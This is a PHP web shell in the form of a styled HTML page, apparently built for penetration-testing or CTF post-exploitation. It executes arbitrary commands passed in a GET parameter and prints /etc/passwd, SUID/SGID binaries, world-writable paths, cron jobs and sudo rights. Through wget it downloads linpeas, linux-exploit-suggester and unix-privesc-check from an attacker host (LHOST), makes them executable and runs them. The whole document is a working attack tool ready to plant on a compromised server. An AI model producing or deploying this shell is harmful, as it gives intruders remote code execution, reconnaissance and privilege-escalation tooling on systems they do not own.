<html>
    <style>

        body {
            background-image: url('https://i.pinimg.com/736x/d2/0e/80/d20e80326cddde76907e4604d49a179d.jpg');
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: cover;
        }

        #page-loader {
            position: fixed;
            z-index:9999;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,.5) url("https://lh5.googleusercontent.com/proxy/fgsSb348vZO2ATMwSLWXKfbwqJRorrIo3zxnr595_JYGByYYvA8sBcah2bkGZ51adU5HvFAJg3ZxPP_ZNca_D60sXtg1IOBE-74m3BgFIfyRQrFV663LKw7UgA=s0-d") center center no-repeat;
        }

        .inputs {
            /* width: 50%;
            margin-right: auto;
            margin-left: auto; */
        }

        .input {
            display: inline-block;
        }

        .input input {
            font-family: "Times New Roman", Times, serif;
            font-size:120%;
        }

        .shell {
            color:RoyalBlue;
            font-size:150%;
            display: flex;
            word-break: break-all;
        }

        .cmd {
            width: 80%;
            white-space: pre-wrap;
        }

        .ids {
            flex-grow: 0;
            flex-shrink: 0;   /* do not shrink - initial value: 1 */
            flex-basis: 25%;
            font-size:170%;
        }

        .inputs input[type="number"],input[type="text"] {
            padding: 8px 12px 10px 12px;
            border: 1px solid rgba(0,0,0,.5);
            background: rgba(0,0,0,.25);
            color: white;
        }

        .inputs input[type="number"] {
            padding: 8px 0px 10px 0px;
            width: 8%;
        }

        .inputs textarea {
            overflow: auto;
            vertical-align: top;
            resize: none;
        }

    </style>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>
    <script>

        // This needs enahancements to be more integrated with php. Possibly using aync calls.
        document.onreadystatechange = function () {
            var state = document.readyState
            if (state == 'interactive') {
                document.getElementById('main').style.visibility="hidden";
            } else if (state == 'complete') {
                setTimeout(function(){
                    document.getElementById('interactive');
                    document.getElementById('page-loader').style.visibility="hidden";
                    document.getElementById('main').style.visibility="visible";
                },1000);
            }
        }
        $(document).ready(function(){
            $('#cmd-inputs').keypress(function(e){
                if(e.keyCode==13){
                    document.getElementById('main-form').submit();
                }
            });
            setTimeout(function() {
                $("#daemon").focus();
            }, 1500);
        });
    </script>
    <body>
        <div id="page-loader"></div>
        <div id="main">
            <?php
                /** Global Variables
                 * Note that the directory write and redirect is for capturing errors, since a direct stream ignores errors.
                **/
                $LHOST_NAME= 'LHOST';
                $LPORT_NAME='LPORT';
                $TMP_DIRECTORY_NAME = 'TMP_DIRECTORY';
                $OUTPUT_FILE_NAME = "OUTPUT_FILE";

                $LHOST= '172.16.1.1';
                $LPORT='80';
                $TMP_DIRECTORY = '/tmp';
                $OUTPUT_FILE = "/tmp/output.txt";

                $CMD1= 'daemon';
                $CMD2='sniffer';

                $DEFAULTS = array(
                    $LHOST_NAME  => '172.16.1.1',
                    $LPORT_NAME => '80',
                    $TMP_DIRECTORY_NAME=> '/tmp',
                    $OUTPUT_FILE_NAME => '/tmp/output.txt'
                );

                function overrideGlobalValues(){
                    global $LHOST, $LPORT, $TMP_DIRECTORY, $OUTPUT_FILE, $LHOST_NAME, $LPORT_NAME, $TMP_DIRECTORY_NAME, $OUTPUT_FILE_NAME;
                    if(isset($_GET)){
                        $LHOST = $_GET[$LHOST_NAME];
                        $LPORT = $_GET[$LPORT_NAME];
                        $TMP_DIRECTORY = $_GET[$TMP_DIRECTORY_NAME];
                        $OUTPUT_FILE = $_GET[$OUTPUT_FILE_NAME];
                    }
                }

                function clear($xName, $txtName) {
                    global $OUTPUT_FILE;
                    system("echo '' > $OUTPUT_FILE");
                }

                function sniff($xName, $txtName) {
                    global $LHOST, $LPORT, $TMP_DIRECTORY, $OUTPUT_FILE;
                    $xsh = system("ls -l $TMP_DIRECTORY/$xName");
                    $xshh = system("head -10 $TMP_DIRECTORY/$xName");
                    $txth = system("head -100 $TMP_DIRECTORY/$txtName");
                    clear();
                    if(empty($xsh) || empty($xshh)){
                        system("wget $LHOST:$LPORT/$xName -O $TMP_DIRECTORY/$xName  &>> $OUTPUT_FILE && chmod 777 $TMP_DIRECTORY/$xName && touch $TMP_DIRECTORY/$txtName");
                    }
                    if(empty($txth)){
                        system("$TMP_DIRECTORY/$xName > $TMP_DIRECTORY/$txtName");
                    }
                    system("cat $TMP_DIRECTORY/$txtName &>> $OUTPUT_FILE");
                    system("cat $OUTPUT_FILE");

                }

                function resetSniffs() {
                    global $LHOST, $LPORT, $OUTPUT_FILE;
                    clear();
                    system("wget $LHOST:$LPORT/linpeas.sh -O $TMP_DIRECTORY/linpeas.sh  &>> $OUTPUT_FILE && chmod 777 $TMP_DIRECTORY/linpeas.sh && touch $TMP_DIRECTORY/linpeas.txt && $TMP_DIRECTORY/linpeas.sh > $TMP_DIRECTORY/linpeas.txt");
                    system("wget $LHOST:$LPORT/les.sh -O $TMP_DIRECTORY/les.sh  &>> $OUTPUT_FILE && chmod 777 $TMP_DIRECTORY/les.sh && touch $TMP_DIRECTORY/les.txt && $TMP_DIRECTORY/les.sh > $TMP_DIRECTORY/les.txt");
                    system("wget $LHOST:$LPORT/unix-privesc-check -O $TMP_DIRECTORY/unix-privesc-check  &>> $OUTPUT_FILE && chmod 777 $TMP_DIRECTORY/unix-privesc-check && touch $TMP_DIRECTORY/unix-privesc-check.txt && $TMP_DIRECTORY/unix-privesc-check > $TMP_DIRECTORY/unix-privesc-check.txt");
                    system("cat $OUTPUT_FILE");
                }

                function displayValue($name){
                    global $DEFAULTS;
                    if (!isset($_GET[$name]) || empty($_GET[$name])) {
                        echo $DEFAULTS[$name];
                    } else {
                        echo $_GET[$name];
                    }
                }
            ?>
            <div>
                <form id="main-form" method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
                    <div class="inputs" >
                        <div class="input" id="cmd-inputs">
                            <input type="TEXT" name="<?php echo $CMD1?>" id="<?php echo $CMD1?>" size="40" placeholder="Dynamic commands" autofocus>
                            <input type="TEXT" name="<?php echo $CMD2?>" id="<?php echo $CMD2?>" size="40" placeholder="Static commands" >
                        </div>
                        <div class="input" style="position:absolute; right:-9%;">
                            <input type="TEXT" name="<?php echo $LHOST_NAME ?>" id="<?php echo $LHOST_NAME ?>" size="11%" placeholder="Local IP" value="<?php displayValue($LHOST_NAME); ?>">
                            <input type="number" name="<?php echo $LPORT_NAME ?>" id="<?php echo $LPORT_NAME ?>" step="1" placeholder="Port" value="<?php displayValue($LPORT_NAME); ?>">
                            <input type="TEXT" name="<?php echo $TMP_DIRECTORY_NAME ?>" id="<?php echo $TMP_DIRECTORY_NAME ?>" size="14%" placeholder="Writeable directory" value="<?php displayValue($TMP_DIRECTORY_NAME); ?>">
                            <input type="TEXT" name="<?php echo $OUTPUT_FILE_NAME ?>" id="<?php echo $OUTPUT_FILE_NAME ?>" size="14%" placeholder="STDOUT directory" value="<?php displayValue($OUTPUT_FILE_NAME); ?>">
                        </div>
                    </div>
                </form>
            </div>
            <div class="shell"">
                <div class="cmd">
                    <?php
                        /** Main execution **/

                        /** Override global values */
                        overrideGlobalValues();

                        /** Execute any command directly in the target shell */
                        if (isset($_GET[$CMD1])) {
                            echo"<br/>";
                            system($_GET[$CMD1]." &> $OUTPUT_FILE");
                            system("cat $OUTPUT_FILE");
                        }

                        /** Execute commads via predefined values */
                        if (isset($_GET[$CMD2])) {
                            $sniffer = $_GET[$CMD2];
                            if($sniffer == "default"){
                                echo"<br/>";
                                echo "Passwd file:<br/>";
                                system('cat /etc/passwd');
                                echo "<br/>";
                                echo "Configuration files in etc:<br/>";
                                system('ls -ls /etc/ | grep .conf');
                                echo "<br/>";
                                echo "Web folder:<br/>";
                                $web=system('ls -ls /var/www/html/');
                                if(empty($web)){
                                    system('ls -ls /var/www/');
                                }
                                echo "<br/>";
                                echo "SUID programs:<br/>";
                                system('find /* -user root -perm -4000 -print 2>/dev/null');
                                echo "<br/>";
                                echo "GUID programs:<br/>";
                                system('find /* -user root -perm -2000 -print 2>/dev/null');
                                echo "<br/>";
                                echo "Unmounted file systems:<br/>";
                                system('cat /etc/fstab');
                                echo "<br/>";
                                echo "World writable directories for root:<br/>";
                                system("find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root");
                                echo "<br/>";
                                echo "World writable files:<br/>";
                                system("find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null");
                                echo "<br/>";
                                echo "Users cron:<br/>";
                                system('crontab -l');
                                echo "<br/>";
                                echo "System cron:<br/>";
                                system('less /etc/crontab');
                            } elseif ($sniffer == "linpeas" || $sniffer == "les" || $sniffer == "unix") {
                                switch ($sniffer) {
                                    case "linpeas":
                                        sniff('linpeas.sh', 'linpeas.txt');
                                        break;
                                    case "les":
                                        sniff('les.sh', 'les.txt');
                                        break;
                                    case "unix":
                                        sniff('unix-privesc-check', 'unix-privesc-check.txt');
                                        break;
                                }
                            } elseif ($sniffer == "reset") {
                                resetSniffs();
                            }
                        }
                    ?>
                </div>
                <div class="ids">
                    <span><b>I am:</b> <?php  system('whoami') ?></span>
                    <hr/>
                    <span><b>Sudo:</b>
                        <?php
                            $sudo=system('sudo -l');
                            if(empty($sudo)){
                                echo "None";
                            }
                        ?>
                    </span>
                    <hr/>
                    <span><b>Host name:</b> <?php  system('hostname') ?></span>
                    <hr/>
                    <span><b>My Groups:</b>
                        <li>
                            <?php  system('groups'); ?>
                        </li>
                    </span>
                    <hr/>
                    <span><b>Passwd:</b>
                        <br/>
                        <?php  system('cat /etc/passwd | grep $(whoami)') ?>
                    </span>
                    <hr/>
                    <span>
                        <b>Versions:</b>
                        <br/>
                        <?php  system('cat /proc/version'); ?>
                    </span>
                    <hr/>
                    <span><b>Issue:</b>
                        <br/>
                        <?php  system('cat /etc/issue') ?>
                    </span>
                    <hr/>
                    <span><b>Uname:</b> <?php  system('uname -m'); ?></span>
                </div>
            </div>

        </div>

    </body>

</html>